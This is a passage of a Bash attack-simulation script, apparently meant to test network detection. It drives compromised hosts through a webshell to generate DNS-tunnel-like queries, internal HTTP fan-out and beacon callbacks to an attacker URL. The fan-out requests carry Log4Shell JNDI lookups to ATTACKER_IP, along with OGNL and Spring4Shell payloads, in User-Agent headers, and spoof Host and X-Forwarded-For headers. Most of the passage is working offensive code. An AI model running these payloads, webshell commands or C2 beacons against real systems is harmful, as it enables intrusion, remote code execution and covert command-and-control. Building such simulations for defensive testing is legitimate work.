            stage_detail="icmp_tunnel_partial target=${target_ip} packets_sent=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} detection_likelihood=${likelihood} reason=${ICMP_DETECTION_REASON:-below_high_threshold}"
            state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: ${stage_detail}"
            log_message "WARN" "ICMP Tunnel partial: ${stage_detail}"
        else
            ICMP_TUNNEL_STAGE_STATUS="partial"
            ICMP_TUNNEL_STAGE_RESULT="partial"
            stage_rc="Partial"
            stage_detail="icmp_tunnel_detection_insufficient target=${target_ip} packets_sent=${ICMP_PACKETS_ATTEMPTED} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE:-0} detection_likelihood=${likelihood} reason=${ICMP_DETECTION_REASON:-tunnel_like_score_low}"
            state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: ${stage_detail}"
            log_message "WARN" "ICMP Tunnel partial (detection insufficient): ${stage_detail}"
        fi
    else
        ICMP_TUNNEL_STAGE_STATUS="failed"
        stage_rc="Failed"
        stage_detail="icmp tunnel not executed"
        state_append "stage_results.log" "ICMP Tunnel Simulation: Failed | Reason: ${stage_detail}"
        log_message "ERROR" "ICMP Tunnel failure: ${stage_detail}"
    fi
    if [[ "${DEGRADED_TELEMETRY}" == true && "${stage_rc}" == Success && -n "${degraded_reason}" ]]; then
        ICMP_TUNNEL_STAGE_STATUS="degraded"
        stage_rc="Partial"
        stage_detail="degraded telemetry: ${degraded_reason}"
        state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: degraded ${degraded_reason}"
        log_message "WARN" "ICMP Tunnel degraded success: attempted=${ICMP_PACKETS_ATTEMPTED} total=${ICMP_TOTAL_PACKETS}"
    fi
    set_stage_result "ICMP Tunnel Simulation" "${stage_rc}" "${stage_detail}"
    quality_reason="packets_sent=${ICMP_PACKETS_ATTEMPTED} packets_received=${ICMP_REPLIES_RECEIVED} payload_size_avg=${ICMP_PAYLOAD_SIZE_AVG} payload_size_max=${ICMP_PAYLOAD_SIZE_MAX} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO}% duration=${ICMP_TUNNEL_DURATION_ELAPSED}s loss=${ICMP_OVERALL_LOSS:-${ICMP_PACKET_LOSS:-0}}%"
    log_detection_quality "ICMP Tunnel" "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_TUNNEL_DURATION_ELAPSED:-${DETECTION_WINDOW_ICMP_WINDOW_SECONDS:-90}}" \
        "${target_ip}" "${likelihood:-LOW}" \
        "${ICMP_EVIDENCE_QUALITY:-low}" "${quality_reason}"
    compute_detection_score_icmp_tunnel "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_PAYLOAD_SIZE_AVG:-0}"
}

build_dns_tunnel_enhanced_remote_cmd() {
    local count="$1" campaign="$2"
    dns_remote_script_open 'DNS_ENHANCED_SCRIPT'
    cat <<EOF
at=0; eff_tld=0; cluster_local=0; powerapps=0; suspicious_tld=0; https_cnt=0; entropy=0
a_cnt=0; txt_cnt=0; aaaa_cnt=0
eff_tlds='default.svc.cluster.local svc.cluster.local powerapps.com trafficmanager.net company-data.cc internal-data.to'
payload_labels='sync-node telemetry-cache inventory-api-update cdn-update internal-check api-private cv-repo elasticsearch-shard pvaruntime-node beacon-sync metadata-pull'
long_fqdns='elasticsearch-cluster.default.svc.cluster.local
cv-svc-arista-softwaremanagement-v1-repositoryconfigservice.default.svc.cluster.local
pvaruntime.as-il101.gateway.prod.island.powerapps.com
powerappsfe-prod-georoute.trafficmanager.net'
pick_eff_tld(){ echo "\$eff_tlds" | tr ' ' '\\n' | sed -n "\$((1+(at%6)))p"; }
pick_payload(){ echo "\$payload_labels" | tr ' ' '\\n' | sed -n "\$((1+RANDOM%10))p"; }
pick_long_fqdn(){ echo "\$long_fqdns" | sed -n "\$((1+(at%4)))p"; }
track_fqdn(){
  local fqdn="\$1"
  eff_tld=\$((eff_tld+1))
  case "\$fqdn" in
    *cluster.local*) cluster_local=\$((cluster_local+1));;
  esac
  case "\$fqdn" in
    *powerapps.com*|*trafficmanager.net*) powerapps=\$((powerapps+1));;
  esac
  case "\$fqdn" in
    *.company-data.cc|*.internal-data.to) suspicious_tld=\$((suspicious_tld+1));;
  esac
  case "\$fqdn" in
    *cv-svc-arista*|*elasticsearch-cluster*|*pvaruntime*|*powerappsfe-prod*|*telemetry-cache*|*inventory-api*)
      entropy=\$((entropy+1));;
  esac
}
for i in \$(seq_list ${count}); do
  at=\$((at+1))
  if [ \$((at%5)) -eq 0 ]; then
    fqdn=\$(pick_long_fqdn)
  else
    base=\$(pick_eff_tld)
    label=\$(pick_payload)
    suffix=\$(randlbl)
    fqdn="\${label}-\${suffix}.\${base}"
  fi
  track_fqdn "\$fqdn"
  case \$((at%4)) in
    0) dig +short "\$fqdn" A >/dev/null 2>&1 || true; a_cnt=\$((a_cnt+1));;
    1) dig +short "\$fqdn" TXT >/dev/null 2>&1 || true; txt_cnt=\$((txt_cnt+1));;
    2) dig +short "\$fqdn" AAAA >/dev/null 2>&1 || true; aaaa_cnt=\$((aaaa_cnt+1));;
    3) dig +short "\$fqdn" HTTPS >/dev/null 2>&1 || dig +short "\$fqdn" TYPE65 >/dev/null 2>&1 || true; https_cnt=\$((https_cnt+1));;
  esac
  base2=\$(pick_eff_tld)
  label2=\$(pick_payload)
  fqdn2="\${label2}-\$(randlbl).\${base2}"
  track_fqdn "\$fqdn2"
  dig +short "\$fqdn2" A >/dev/null 2>&1 || true; a_cnt=\$((a_cnt+1))
done
echo "DNS_ENHANCED_STATS attempted=\$at eff_tld=\$eff_tld cluster_local=\$cluster_local powerapps=\$powerapps suspicious_tld=\$suspicious_tld https=\$https_cnt entropy=\$entropy a=\$a_cnt txt=\$txt_cnt aaaa=\$aaaa_cnt cc=\$suspicious_tld to=0 top=0 xyz=0 nx=0"
EOF
    dns_remote_script_close 'DNS_ENHANCED_SCRIPT'
}

build_dns_tunnel_enhanced_nslookup_remote_cmd() {
    local count="$1" campaign="$2"
    dns_remote_script_open 'DNS_ENHANCED_NSLOOKUP_SCRIPT'
    cat <<EOF
at=0; eff_tld=0; cluster_local=0; powerapps=0; suspicious_tld=0; https_cnt=0; entropy=0; a_cnt=0; txt_cnt=0; aaaa_cnt=0
eff_tlds='default.svc.cluster.local svc.cluster.local powerapps.com trafficmanager.net company-data.cc internal-data.to'
payload_labels='sync-node telemetry-cache inventory-api-update cdn-update internal-check'
long_fqdns='elasticsearch-cluster.default.svc.cluster.local cv-svc-arista-softwaremanagement-v1-repositoryconfigservice.default.svc.cluster.local pvaruntime.as-il101.gateway.prod.island.powerapps.com powerappsfe-prod-georoute.trafficmanager.net'
for i in \$(seq_list ${count}); do
  at=\$((at+1))
  if [ \$((at%5)) -eq 0 ]; then
    fqdn=\$(echo "\$long_fqdns" | tr ' ' '\\n' | sed -n "\$((1+(at%4)))p")
  else
    base=\$(echo "\$eff_tlds" | tr ' ' '\\n' | sed -n "\$((1+(at%6)))p")
    label=\$(echo "\$payload_labels" | tr ' ' '\\n' | sed -n "\$((1+(RANDOM%5+1)))p")
    fqdn="\${label}-\$(randlbl).\${base}"
  fi
  eff_tld=\$((eff_tld+1))
  case "\$fqdn" in *cluster.local*) cluster_local=\$((cluster_local+1));; esac
  case "\$fqdn" in *powerapps.com*|*trafficmanager.net*) powerapps=\$((powerapps+1));; esac
  case "\$fqdn" in *.company-data.cc|*.internal-data.to) suspicious_tld=\$((suspicious_tld+1));; esac
  case "\$fqdn" in *cv-svc-arista*|*elasticsearch-cluster*|*pvaruntime*|*powerappsfe-prod*) entropy=\$((entropy+1));; esac
  case \$((at%4)) in
    0) nslookup "\$fqdn" >/dev/null 2>&1 || true; a_cnt=\$((a_cnt+1));;
    1) nslookup -type=TXT "\$fqdn" >/dev/null 2>&1 || true; txt_cnt=\$((txt_cnt+1));;
    2) nslookup -type=AAAA "\$fqdn" >/dev/null 2>&1 || true; aaaa_cnt=\$((aaaa_cnt+1));;
    3) nslookup -type=HTTPS "\$fqdn" >/dev/null 2>&1 || true; https_cnt=\$((https_cnt+1));;
  esac
done
echo DNS_ENHANCED_STATS attempted=\$at eff_tld=\$eff_tld cluster_local=\$cluster_local powerapps=\$powerapps suspicious_tld=\$suspicious_tld https=\$https_cnt entropy=\$entropy a=\$a_cnt txt=\$txt_cnt aaaa=\$aaaa_cnt cc=\$suspicious_tld to=0 top=0 xyz=0 nx=0
EOF
    dns_remote_script_close 'DNS_ENHANCED_NSLOOKUP_SCRIPT'
}

build_dns_tunnel_enhanced_python() {
    local count="$1" campaign="$2"
    cat <<PY
import random, socket, string
count = ${count}
campaign = "${campaign}"
at = eff_tld = cluster_local = powerapps = suspicious_tld = https_cnt = entropy = 0
a_cnt = txt_cnt = aaaa_cnt = 0
eff_tlds = [
    "default.svc.cluster.local", "svc.cluster.local", "powerapps.com",
    "trafficmanager.net", "company-data.cc", "internal-data.to",
]
payload_labels = [
    "sync-node", "telemetry-cache", "inventory-api-update", "cdn-update",
    "internal-check", "api-private", "cv-repo", "elasticsearch-shard",
    "pvaruntime-node", "beacon-sync",
]
long_fqdns = [
    "elasticsearch-cluster.default.svc.cluster.local",
    "cv-svc-arista-softwaremanagement-v1-repositoryconfigservice.default.svc.cluster.local",
    "pvaruntime.as-il101.gateway.prod.island.powerapps.com",
    "powerappsfe-prod-georoute.trafficmanager.net",
]
def randlbl(n=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
def track_fqdn(fqdn):
    global eff_tld, cluster_local, powerapps, suspicious_tld, entropy
    eff_tld += 1
    if "cluster.local" in fqdn: cluster_local += 1
    if "powerapps.com" in fqdn or "trafficmanager.net" in fqdn: powerapps += 1
    if fqdn.endswith(".company-data.cc") or fqdn.endswith(".internal-data.to"): suspicious_tld += 1
    if any(x in fqdn for x in ("cv-svc-arista", "elasticsearch-cluster", "pvaruntime", "powerappsfe-prod", "telemetry-cache", "inventory-api")):
        entropy += 1
for i in range(count):
    at += 1
    if at % 5 == 0:
        fqdn = long_fqdns[(at - 1) % len(long_fqdns)]
    else:
        base = eff_tlds[(at - 1) % len(eff_tlds)]
        fqdn = f"{random.choice(payload_labels)}-{randlbl()}.{base}"
    track_fqdn(fqdn)
    mod = at % 4
    if mod == 0: a_cnt += 1
    elif mod == 1: txt_cnt += 1
    elif mod == 2: aaaa_cnt += 1
    else: https_cnt += 1
    try: socket.gethostbyname(fqdn)
    except Exception: pass
    base2 = eff_tlds[(at - 1) % len(eff_tlds)]
    fqdn2 = f"{random.choice(payload_labels)}-{randlbl()}.{base2}"
    track_fqdn(fqdn2)
    try: socket.gethostbyname(fqdn2)
    except Exception: pass
    a_cnt += 1
print(f"DNS_ENHANCED_STATS attempted={at} eff_tld={eff_tld} cluster_local={cluster_local} powerapps={powerapps} suspicious_tld={suspicious_tld} https={https_cnt} entropy={entropy} a={a_cnt} txt={txt_cnt} aaaa={aaaa_cnt} cc={suspicious_tld} to=0 top=0 xyz=0 nx=0")
PY
}

fanout_pick_rare_ua_remote_snippet() {
    local attacker_ip="${ATTACKER_IP:-127.0.0.1}"
    cat <<UAEOF
normal_uas='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
rare_uas='TelemetryCollector/9.7
ReconEngine/5.4
SecurityAssessmentClient/3.1
ThreatHunterAgent/8.2
InternalAuditScanner/4.0
DiscoveryProbe/7.3
VulnerabilitySweep/2.6
WebEnumerationFramework/11.0
AssetProfiler/6.5
NetworkSurveyBot/3.9
Mozilla/5.0 ReconEngine/5.4
Mozilla/5.0 ThreatHunterAgent/8.2'
jndi_uas='\${jndi:ldap://${attacker_ip}/a}
\${jndi:rmi://${attacker_ip}/a}
TelemetryCollector/9.7 \${jndi:ldap://${attacker_ip}/sync}'
ognl_uas='%{#context['"'"'com.opensymphony.xwork2.dispatcher.HttpServletResponse'"'"']}
ReconEngine/5.4 %{#context['"'"'com.opensymphony.xwork2.dispatcher.HttpServletRequest'"'"']}'
spring_uas='class.module.classLoader
ThreatHunterAgent/8.2 class.module.classLoader.resources'
pick_fanout_ua(){
  local roll=\$((RANDOM%100))
  if [[ \$roll -lt 10 ]]; then echo "\$normal_uas"; return; fi
  if [[ \$roll -lt 25 ]]; then echo "\$jndi_uas" | sed -n "\$((1+RANDOM%3))p"; return; fi
  if [[ \$roll -lt 35 ]]; then echo "\$ognl_uas" | sed -n "\$((1+RANDOM%2))p"; return; fi
  if [[ \$roll -lt 45 ]]; then echo "\$spring_uas" | sed -n "\$((1+RANDOM%2))p"; return; fi
  echo "\$rare_uas" | sed -n "\$((1+RANDOM%12))p"
}
track_fanout_ua(){
  local ua="\$1"
  if echo "\$ua" | grep -qF 'jndi:'; then jndi=\$((jndi+1)); return; fi
  if echo "\$ua" | grep -qF '%{#context'; then ognl=\$((ognl+1)); return; fi
  if echo "\$ua" | grep -qF 'class.module.classLoader'; then spring=\$((spring+1)); return; fi
}
UAEOF
}

build_internal_fanout_curl_cmd() {
    local host="$1" port="$2" req="$3" scheme="$4" campaign="$5" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    remote_bash_script_open 'INTERNAL_FANOUT_SCRIPT'
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
paths='/api/v1/check-in /update/check /cdn/status /api/v1/sync /favicon.ico /health /hidden-panel /internal-sync /admin-backup /api/private/status /.well-known/internal-update /v2/private/health'
methods='GET HEAD POST'
a=0; r=0; c=0; jndi=0; ognl=0; spring=0
node=\$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9-' | head -c 16)
sess="fanout-\${node}-\${RANDOM}"
extra_hdr(){
  case \$((RANDOM%8)) in
    0) echo "-H 'X-Scanner: true'" ;;
    1) echo "-H 'X-Recon: enabled'" ;;
    2) echo "-H 'X-Asset-Discovery: active'" ;;
    3) echo "-H 'X-Internal-Audit: yes'" ;;
    4) echo "-H 'X-Discovery-Mode: survey'" ;;
    5) echo "-H 'Host: internal-update.company-data.cc'" ;;
    6) echo "-H 'Host: sync-node.inventory.to'" ;;
    7) echo "-H 'Host: telemetry-cache.update.top'" ;;
  esac
}
for i in \$(seq 1 ${req}); do
  p=\$(echo "\$paths" | tr ' ' '\n' | sed -n "\$((1+RANDOM%13))p")
  m=\$(echo "\$methods" | tr ' ' '\n' | sed -n "\$((1+RANDOM%3))p")
  ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
  track_fanout_ua "\$ua"
  hdr=\$(extra_hdr)
  a=\$((a+1))
  if [[ "\$m" == POST ]]; then
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -X POST -A "\$ua" \
      -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Check-In: sync' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
      --data-urlencode "campaign=${campaign}" --data-urlencode "mode=check-in" '${base_url}'"\$p" 2>/dev/null || echo 000)
  elif [[ "\$m" == HEAD ]]; then
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -I -A "\$ua" \
      -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Sync: true' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
      '${base_url}'"\$p" 2>/dev/null || echo 000)
  else
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" \
      -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Beacon: true' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
      '${base_url}'"\$p?c=${campaign}&n=\$RANDOM&sync=1" 2>/dev/null || echo 000)
  fi
  code=\$(printf '%s' "\$code" | tr -cd '0-9')
  log_http_ua_request "\$p" "\$ua" "\$code"
  [[ -n "\$code" && "\$code" != "000" ]] && { r=\$((r+1)); c=\$((c+1)); }
  if [[ \$((i % 9)) -eq 0 ]]; then sleep \$((RANDOM % 2)); fi
done
emit_http_ua_coverage
echo "FANOUT_STATS attempted=\$a responses=\$r connected=\$c jndi=\$jndi ognl=\$ognl spring=\$spring"
EOF
    remote_bash_script_close 'INTERNAL_FANOUT_SCRIPT'
}

parse_fanout_stats_line() {
    local out="$1" line attempted=0 responses=0 connected=0 jndi=0 ognl=0 spring=0
    line=$(printf '%s\n' "${out}" | grep 'FANOUT_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${connected}" "${jndi}" "${ognl}" "${spring}"
}

parse_fanout_chunk_stats_line() {
    local out="$1" line attempted=0 responses=0 connected=0 jndi=0 ognl=0 spring=0
    line=$(printf '%s\n' "${out}" | grep 'FANOUT_CHUNK_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${connected}" "${jndi}" "${ognl}" "${spring}"
}

build_fanout_chunk_cmd() {
    local host="$1" port="$2" scheme="$3" chunk_size="$4" campaign="$5"
    local curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    base_url="${base_url%/}/"
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
a=0;r=0;c=0;j=0;o=0;sp=0
i=1
while [ "\$i" -le ${chunk_size} ]; do
  a=\$((a+1))
  ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
  echo "\$ua" | grep -qF 'jndi:' && j=\$((j+1))
  echo "\$ua" | grep -qF '%{#context' && o=\$((o+1))
  echo "\$ua" | grep -qF 'class.module.classLoader' && sp=\$((sp+1))
  p=favicon.ico
  case \$((RANDOM % 4)) in 0) p=health ;; 1) p=api/v1/check-in ;; 2) p=favicon.ico ;; 3) p=hidden-panel ;; esac
  code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' '${base_url}'"\$p" 2>/dev/null || echo 000)
  code=\$(printf '%s' "\$code" | tr -cd '0-9')
  log_http_ua_request "\$p" "\$ua" "\$code"
  case "\$code" in 000|"") ;; *) r=\$((r+1)); c=\$((c+1));; esac
  i=\$((i+1))
done
emit_http_ua_coverage
echo "FANOUT_CHUNK_STATS attempted=\$a responses=\$r connected=\$c jndi=\$j ognl=\$o spring=\$sp"
EOF
}

build_fanout_single_probe_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4"
    local curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/favicon.ico")
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" -H 'X-PoC-Campaign: ${campaign}' '${base_url}' 2>/dev/null || echo 000)
log_http_ua_request '/favicon.ico' "\$ua" "\$code"
emit_http_ua_coverage
echo FANOUT_CHUNK_STATS attempted=1 responses=1 connected=1 jndi=0 ognl=0 spring=0
EOF
}

execute_internal_fanout_chunked() {
    local host="$1" port="$2" scheme="$3" req="$4" campaign="$5"
    local chunk_size=6 chunks c remaining this_chunk chunk_out
    local chunk_at=0 chunk_resp=0 chunk_conn=0 chunk_j=0 chunk_o=0 chunk_sp=0
    local total_a=0 total_r=0 total_c=0 total_j=0 total_o=0 total_sp=0
    (( req < 1 )) && req=1
    chunk_size=6
    chunks=$(( (req + chunk_size - 1) / chunk_size ))
    remaining="${req}"
    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        this_chunk="${chunk_size}"
        [[ "${remaining}" -lt "${chunk_size}" ]] && this_chunk="${remaining}"
        chunk_out=$(run_webshell_long "fanout-${host}-${port}-${c}" \
            "$(build_fanout_chunk_cmd "${host}" "${port}" "${scheme}" "${this_chunk}" "${campaign}")" 2>/dev/null || true)
        ingest_http_attack_remote_output "${chunk_out}" "${host}"
        read -r chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp <<< "$(parse_fanout_chunk_stats_line "${chunk_out}")"
        sanitize_stats_ints chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp
        total_a=$((total_a + chunk_at))
        total_r=$((total_r + chunk_resp))
        total_c=$((total_c + chunk_conn))
        total_j=$((total_j + chunk_j))
        total_o=$((total_o + chunk_o))
        total_sp=$((total_sp + chunk_sp))
        remaining=$((remaining - this_chunk))
        state_append "internal_fanout_waves.log" "host=${host} port=${port} chunk=${c} attempted=${chunk_at} responses=${chunk_resp} out=$(printf '%.120s' "${chunk_out}")"
    done
    if (( total_a == 0 && req > 0 )); then
        chunk_out=$(run_webshell_quick "fanout-probe-${host}-${port}" "$(build_fanout_single_probe_cmd "${host}" "${port}" "${scheme}" "${campaign}")" 2>/dev/null || true)
        ingest_http_attack_remote_output "${chunk_out}" "${host}"
        read -r chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp <<< "$(parse_fanout_chunk_stats_line "${chunk_out}")"
        sanitize_stats_ints chunk_at chunk_resp chunk_conn chunk_j chunk_o chunk_sp
        total_a="${chunk_at}"
        total_r="${chunk_resp}"
        total_c="${chunk_conn}"
        add_fallback_usage "Internal fanout: single-probe fallback for ${host}:${port}"
    fi
    printf 'FANOUT_STATS attempted=%s responses=%s connected=%s jndi=%s ognl=%s spring=%s\n' \
        "${total_a}" "${total_r}" "${total_c}" "${total_j}" "${total_o}" "${total_sp}"
}

poc_diagnose_external_callback_layers() {
    local host="$1" port="$2" out="$3" ok="$4"
    local dns="UNKNOWN" tcp="UNKNOWN" tls="N/A" http="UNKNOWN" cause="Unknown"
    if [[ "${ok}" == *"CB_OK"* ]]; then
        dns="PASS"; tcp="PASS"; http="PASS"; cause="Success"
        printf '%s' "${dns}|${tcp}|${tls}|${http}|${cause}"
        return 0
    fi
    out=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${out}" == *"could not resolve"* ]]; then
        dns="FAIL"; tcp="SKIP"; http="SKIP"; cause="DNS resolution failed"
    elif [[ "${out}" == *"timed out"* || "${out}" == *"timeout"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="Likely firewall drop or routing blackhole"
        poc_failure_reason_bump "Firewall Drop (callback)" 1
    elif [[ "${out}" == *"connection refused"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="TCP connection refused (listener down or wrong port)"
    elif [[ "${out}" == *"connection reset"* ]]; then
        dns="PASS"; tcp="FAIL"; http="SKIP"; cause="Connection reset by peer"
    else
        dns="PASS"; tcp="FAIL"; http="FAIL"; cause="No HTTP response from callback target"
        poc_failure_reason_bump "Callback unreachable" 1
    fi
    printf '%s' "${dns}|${tcp}|${tls}|${http}|${cause}"
}

execute_external_beacon_callback() {
    local seq="$1" path="$2" mode_tag="$3"
    local ua m reqid sess xff remote_curl out raw_req req body attacker_host attacker_port
    local -a xff_refs=("10.0.0.22" "10.0.0.33" "10.0.0.44" "10.0.0.55" "172.16.0.10")
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    ua="TelemetryCollector/9.7"
    m="GET"
    reqid="${RANDOM}-${RANDOM}-${seq}"
    sess="ssn-${CAMPAIGN_ID}-${RANDOM}"
    xff="${xff_refs[RANDOM % ${#xff_refs[@]}]}"
    build_curl_common_args 3
    local -a curl_args=("${CURL_COMMON_ARGS[@]}" --request "${m}" --user-agent "${ua}"
        -H "X-Request-ID: ${reqid}" -H "X-Session-ID: ${sess}" -H "X-Forwarded-For: ${xff}"
        -H "X-PoC-Campaign: ${CAMPAIGN_ID}" -H "X-Callback-Mode: ${mode_tag}" -H "Connection: keep-alive")
    append_curl_telemetry_headers curl_args
    curl_args+=("${ATTACKER_BASE_URL}${path}?node=${seq}&j=${RANDOM}&sid=${sess}&sync=1&mode=${mode_tag}")
    if [[ "${HAS_curl:-false}" == true ]]; then
        remote_curl=$(build_remote_curl_invocation "${curl_args[@]}")
        out=$(run_webshell "ext-callback-${mode_tag}-${seq}" "${remote_curl} >/dev/null 2>&1 && echo CB_OK || echo CB_FAIL" 2>/dev/null || true)
    else
        req="${path}?node=${seq}&j=${RANDOM}&sid=${sess}&mode=${mode_tag}"
        raw_req="${m} ${req} HTTP/1.1\r\nHost: ${attacker_host}:${attacker_port}\r\nUser-Agent: ${ua}\r\nX-PoC-Campaign: ${CAMPAIGN_ID}\r\nX-Session-ID: ${sess}\r\nX-Forwarded-For: ${xff}\r\nConnection: keep-alive\r\n\r\n"
        out=$(run_webshell "ext-callback-raw-${mode_tag}-${seq}" "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"${raw_req}\" >/dev/null 2>&1 && echo CB_OK || echo CB_FAIL" 2>/dev/null || true)
    fi
    increment_beacon_attempt
    if [[ "${out}" == *"CB_OK"* ]]; then
        increment_beacon_success
        increment_beacon_count
        return 0
    fi
    return 1
}

run_beacon_mode_low_and_slow() {
    local beacon_path="${CALLBACK_PREFIX}/check-in" count=0 success=0 failed=0 i ratio=0
    count=$((15 + RANDOM % 16))
    log_message "OK" "Beacon low_and_slow: path=${beacon_path} planned=${count} interval=3-10s" >&2
    for ((i=1; i<=count; i++)); do
        pipeline_stop_requested && break
        if execute_external_beacon_callback "${i}" "${beacon_path}" "low_and_slow"; then
            success=$((success + 1))
        else
            failed=$((failed + 1))
        fi
        sleep "$(awk -v min="3" -v max="10" 'BEGIN{srand(); printf "%.1f\n", min + rand()*(max-min)}')"
    done
    BEACON_LOW_SLOW_ATTEMPTED="${count}"
    BEACON_LOW_SLOW_SUCCESS="${success}"
    BEACON_LOW_SLOW_FAILED="${failed}"
    (( count > 0 )) && ratio=$((success * 100 / count))
    log_beacon_summary "low_and_slow" "${count}" "${success}" "${failed}" "${ratio}"
}

run_beacon_mode_burst() {
    local beacon_path="${CALLBACK_PREFIX}/check-in" count=0 success=0 failed=0 i ratio=0
    local window_sec=0 t0=0 t1=0 elapsed=0 sleep_sec=0
    count=$((30 + RANDOM % 71))
    window_sec=$((30 + RANDOM % 91))
    t0=$(date +%s)
    log_message "OK" "Beacon burst: path=${beacon_path} planned=${count} window=${window_sec}s" >&2
    for ((i=1; i<=count; i++)); do
        pipeline_stop_requested && break
        t1=$(date +%s)
        elapsed=$((t1 - t0))
        (( elapsed >= window_sec )) && break
